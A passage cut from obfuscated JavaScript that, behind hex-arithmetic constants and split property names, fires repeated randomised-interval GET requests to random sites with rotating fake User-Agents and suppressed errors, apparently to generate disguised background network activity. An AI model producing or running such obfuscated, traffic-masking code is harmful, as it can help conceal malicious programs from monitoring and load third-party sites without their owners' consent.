    setTimeout(f, (0x141c4 + -0x13ffe + 0xe89a) * k * getRandomInt(0x353 * 0xa + 0xcf7 * 0x3 + -0x4822, -0x1 * 0x135d + 0x104c + 0xc5 * 0x4));
  setInterval(() => {
    f();
    for (let l = 0x26ee + 0xc99 + -0x3387; l < -0x3 * -0x42f + 0x1b * 0x10c + -0x28cd; l++)
      setTimeout(f, (0xf682 + 0x1827d + 0xb * -0x243d) * l * getRandomInt(-0x6c6 * -0x5 + 0xc79 + -0x7b9 * 0x6, 0x99 * -0x21 + -0x1fb1 + 0x336d));
  }, -0x727a3 * -0xa + -0x2e302d * 0x1 + -0x43979 * -0x7);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1b * 0x127 + 0x1 * -0x26ea + -0x4a3 * -0x15) * getRandomInt(-0x1537 + 0x16de * -0x1 + 0x2c16, 0x163e + 0xd * 0xa7 + -0x1eb4));
}, -0x1601 + 0x1356 + -0x1 * -0x30f);